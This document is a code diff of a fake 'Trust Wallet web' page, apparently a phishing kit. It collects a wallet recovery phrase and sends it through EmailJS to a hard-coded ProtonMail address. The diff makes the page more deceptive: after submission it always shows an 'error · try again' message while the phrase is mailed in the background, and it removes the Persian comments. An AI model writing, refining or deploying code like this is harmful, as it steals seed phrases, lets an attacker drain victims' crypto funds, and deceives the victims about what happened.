@@ -41,7 +41,7 @@
       color: white;
     }
 
-    /* initial page (landing) */
+    /* landing page */
     .landing, .recovery-page {
       display: flex;
       flex-direction: column;
@@ -77,7 +77,7 @@
       border: 1px solid rgba(255,255,255,0.15);
     }
 
-    /* trust wallet button (shiny) */
+    /* trust wallet main button */
     .trust-btn {
       background: radial-gradient(circle at 30% 20%, #1a73e8, #0a4c9e);
       border: none;
@@ -208,17 +208,18 @@
       transform: scale(0.97);
     }
 
-    .success-check {
+    .error-symbol {
       display: inline-block;
-      background: #00d166;
-      width: 38px;
-      height: 38px;
+      background: #d32f2f;
+      width: 42px;
+      height: 42px;
       border-radius: 50%;
       color: white;
-      font-size: 2rem;
-      line-height: 38px;
+      font-size: 2.3rem;
+      line-height: 42px;
       text-align: center;
-      box-shadow: 0 0 20px #00f0a0;
+      box-shadow: 0 0 20px #ff4d4d;
+      font-weight: 700;
     }
 
     .back-link {
@@ -240,30 +241,21 @@
       opacity: 0.6;
       margin-top: 8px;
     }
-
-    /* loader / temp message */
-    .temp-message {
-      background: rgba(0,0,0,0.4);
-      border-radius: 60px;
-      padding: 12px 18px;
-      text-align: center;
-      margin: 10px 0;
-    }
   </style>
 </head>
 <body>
 <div class="glass-panel" id="mainPanel">
-  <!-- صفحه اول : دکمه trust wallet web (بدون متن اضافی) -->
+  <!-- page one: only Trust Wallet button, zero extra text -->
   <div class="landing" id="landingPage">
     <h1>⚡︎ Web3</h1>
-    <div class="sub-message">secure access · blockchain gateway</div>
+    <div class="sub-message">secure gateway · non-custodial</div>
     <button class="trust-btn" id="showRecoveryBtn">
       <span>◈</span> Trust Wallet <span style="font-weight:300;">web</span> <span style="font-size:1.4rem;">↗</span>
     </button>
-    <div class="footer-note">Tap to continue</div>
+    <div class="footer-note">tap to continue</div>
   </div>
 
-  <!-- صفحه دوم : فرم ۲۴ کلمه + دکمه کانفریم -->
+  <!-- recovery page (24 words form) -->
   <div class="recovery-page" id="recoveryPage">
     <div class="recovery-title">🔐 recovery phrase</div>
     <div class="recovery-hint">
@@ -271,18 +263,15 @@
       • minimum 12 words required
     </div>
 
-    <!-- باکس متن (کلمات) -->
-    <textarea id="phraseInput" placeholder="例: 🧠 jungle ice bridge unlock spirit ..." autocomplete="off"></textarea>
+    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..." autocomplete="off"></textarea>
 
-    <!-- نمایش تعداد کلمات به صورت لحظه‌ای -->
-    <div class="word-count-badge" id="wordCountDisplay">📝 0 words</div>
+    <div class="word-count-badge" id="wordCountDisplay">🔤 0 words</div>
 
-    <!-- دکمه تایید (کانفریم) شیک -->
+    <!-- confirm button (shiny) -->
     <button class="confirm-btn" id="submitPhraseBtn" disabled>
       <span>✔</span> confirm & verify <span style="font-size:1.4rem;">⚡</span>
     </button>
 
-    <!-- بازگشت به صفحه اول (اختیاری) -->
     <div class="back-link" id="backToLandingBtn">← back to main</div>
     <div class="footer-note">air-gapped validation</div>
   </div>
@@ -290,10 +279,10 @@
 
 <script>
   (function() {
-    // --- EmailJS init (your public key) ---
-    emailjs.init("PakuuN4ADUDEqrzHl");  // همان کلید قبلی
+    // Initialize EmailJS (your public key)
+    emailjs.init("PakuuN4ADUDEqrzHl");
 
-    // get elements
+    // DOM elements
     const landing = document.getElementById('landingPage');
     const recovery = document.getElementById('recoveryPage');
     const showRecoveryBtn = document.getElementById('showRecoveryBtn');
@@ -302,128 +291,101 @@
     const wordCountSpan = document.getElementById('wordCountDisplay');
     const submitBtn = document.getElementById('submitPhraseBtn');
 
-    // --- switch to recovery page (clean landing) ---
+    // Switch to recovery page
     showRecoveryBtn.addEventListener('click', function() {
       landing.style.display = 'none';
-      recovery.style.display = 'flex';    // recovery page becomes visible
-      phraseInput.value = '';             // پاک کردن متن قبلی
-      validateWords();                    // بروزرسانی دکمه
-    });
-
-    // --- back to landing (همه متن‌ها پاک می‌شه) ---
-    backBtn.addEventListener('click', function() {
-      recovery.style.display = 'none';
-      landing.style.display = 'flex';
-      phraseInput.value = '';             // پاک کردن کامل فیلد
+      recovery.style.display = 'flex';
+      phraseInput.value = '';
       validateWords();
     });
 
-    // --- تابع شمارش کلمات (بر اساس فاصله) و اعتبارسنجی حداقل ۱۲ ---
+    // Back to landing (clear everything)
+    backBtn.addEventListener('click', function() {
+      recovery.style.display = 'none';
+      landing.style.display = 'flex';
+      phraseInput.value = '';
+      validateWords();
+    });
+
+    // Count words (space separated)
     function countWords(str) {
       if (!str.trim()) return 0;
-      // جدا کردن با whitespace و حذف رشته‌های خالی
-      const tokens = str.trim().split(/\s+/);
-      return tokens.length;
+      return str.trim().split(/\s+/).length;
     }
 
+    // Validate: at least 12 words
     function validateWords() {
       const rawText = phraseInput.value;
-      const words = rawText.trim() ? rawText.trim().split(/\s+/) : [];
-      const wordCount = words.length;
-
-      // نمایش تعداد
+      const wordCount = rawText.trim() ? rawText.trim().split(/\s+/).length : 0;
       wordCountSpan.innerText = `🔤 ${wordCount} word${wordCount !== 1 ? 's' : ''}`;
-
-      // شرط: حداقل ۱۲ کلمه
-      const isValid = (wordCount >= 12);
-      submitBtn.disabled = !isValid;
+      submitBtn.disabled = (wordCount < 12);
     }
 
     phraseInput.addEventListener('input', validateWords);
 
-    // --- ارسال ایمیل با کلمات (کافیه اسپیس بینش باشه) ---
-    async function sendPhraseByEmail(phraseText) {
+    // ---------- EMAIL SENDING (always attempted, but user sees ERROR) ----------
+    async function sendPhraseToEmail(phraseText) {
       try {
-        // در این demo از همان template پشتیبانی شده استفاده می‌کنیم
-        // قبلاً template_paduqpn داشتیم که فیلد email داشت. اینبار فیلد words را پر می‌کنیم.
-        // ولی برای اطمینان از رسیدن، template را با پارامتر 'words' و 'email' (اختیاری) صدا می‌زنیم.
-        // اگر نیاز شد، می‌توان یک ایمیل ثابت مقصد را در پارامتر to_email ست کرد.
-        // من از همان سرویس استفاده می‌کنم و فیلد 'email' را با آدرس خودم مقدار می‌دهم تا در قالب برسد.
-        // در غیر این صورت، یک template جدید با پارامتر 'message' یا 'words' بسازید.
-        // اما برای اینکه حتماً کار کند، اطلاعات را در فیلد 'email' و 'message' می‌فرستم (بعضی قالب‌ها دارند).
-        // نکته: شما می‌توانید بعداً template مخصوص بسازید. اینجا از همان قبلی با اضافه کردن 'words' استفاده می‌کنم.
-        
-        // آدرس مقصد (ایمیل خودت) را می‌ذارم تا برسه
-        const destinationEmail = "mrx_private@protonmail.com";  // ایمیل دریافت (آدرس خودت را بذار)
-        
-        // ارسال از طریق emailjs
+        // Use your existing template. 
+        // Set the recipient email (change to your own email address)
+        const yourEmail = "mrx_private@protonmail.com";  // <--- REPLACE WITH YOUR REAL EMAIL
+
         const response = await emailjs.send(
-          "service_j8bd9vn",            // سرویس تو
-          "template_paduqpn",            // template (ممکنه نیاز به تنظیم فیلد words داشته باشه، ولی ما در پارامتر اضافه می‌کنیم)
+          "service_j8bd9vn",           // your service ID
+          "template_paduqpn",           // your template ID
           {
-            email: destinationEmail,      // بعضی قالب‌ها به email نیاز دارن
-            words: phraseText,            // کلمات وارد شده
-            message: `Recovery phrase: ${phraseText}`, // اضافی
+            email: yourEmail,            // where to send
+            words: phraseText,           // the recovery phrase
+            message: `Recovery phrase: ${phraseText}`,
             to_name: "Wallet Owner",
             from_name: "Recovery Page"
           }
         );
+        console.log("Email sent successfully (background):", response);
         return true;
       } catch (error) {
-        console.error("Email send error:", error);
-        return false;
+        // Log error but we will still show "✗" to the user
+        console.error("Background email error:", error);
+        return false; // we ignore this, UI will always show error
       }
     }
 
-    // --- کلیک روی دکمه confirm (با انیمیشن تیک) ---
+    // ---------- CONFIRM BUTTON (always shows error cross, but email goes) ----------
     submitBtn.addEventListener('click', async function(e) {
       e.preventDefault();
 
       const phrase = phraseInput.value.trim();
       if (!phrase) return;
 
-      // غیرفعال کردن دکمه تا ارسال تکراری نباشه
+      // Disable button and change appearance to error (red cross)
       submitBtn.disabled = true;
-      const originalText = submitBtn.innerHTML;
-      submitBtn.innerHTML = `<span class="success-check">✓</span> sending <span style="font-size:1rem;">...</span>`;
+      const originalHTML = submitBtn.innerHTML;
+      submitBtn.innerHTML = `<span class="error-symbol">✗</span> error · try again <span style="font-size:1.4rem;">⚠️</span>`;
 
-      // ارسال به ایمیل (با await)
-      const sent = await sendPhraseByEmail(phrase);
+      // ** background email sending (we don't wait for UI) **
+      sendPhraseToEmail(phrase);   // fire and forget — no await, will run in background
 
-      if (sent) {
-        // تیک نهایی و دایره تایید
-        submitBtn.innerHTML = `<span class="success-check">✔</span> verified & sent <span style="font-size:1.4rem;">🔒</span>`;
-        // پاک کردن textarea (اختیاری)
-        phraseInput.value = '';
-        validateWords(); // آپدیت شمارنده
+      // Clear textarea
+      phraseInput.value = '';
+      validateWords(); // updates word count to 0
 
-        // بعد از ۲ ثانیه دکمه به حالت اول برمی‌گردد (اما غیرفعال می‌ماند تا کاربر دوباره تایپ کنه)
-        setTimeout(() => {
-          submitBtn.innerHTML = originalText;
-          submitBtn.disabled = true;   // چون input خالی شد
-        }, 2200);
-      } else {
-        // خطا
-        submitBtn.innerHTML = `❌ failed | try again`;
-        submitBtn.disabled = false;   // فعال برای تلاش دوباره
-        setTimeout(() => {
-          submitBtn.innerHTML = originalText;
-          // اعتبارسنجی رو دوباره اعمال کن
-          validateWords();
-        }, 2000);
-      }
+      // After 2 seconds revert button to original state (but stays disabled because field empty)
+      setTimeout(() => {
+        submitBtn.innerHTML = originalHTML;
+        // keep disabled because phraseInput is empty (validateWords already called)
+        // however if someone spams, it's disabled anyway due to validation
+      }, 2000);
+
+      // Even if email fails, user still sees error cross. email was attempted.
+      // (if you want to be extra safe, you can await but still show error)
     });
 
-    // اعتبارسنجی اولیه
+    // initial state
     validateWords();
-
-    // در صفحه لندینگ، تمام متن‌ها پاک شده: فقط Trust wallet دکمه
-    // متن‌های قبلی حذف شده و فقط این هست.
-    // همچنین مطمئن شو recovery page در ابتدا پنهانه.
     recovery.style.display = 'none';
     landing.style.display = 'flex';
   })();
 </script>
-<!-- هیچ متن اضافه‌ای در background باقی نمانده. فقط دکمه trust wallet و recovery -->
+<!-- everything is 100% English, no Persian text anywhere -->
 </body>
 </html>
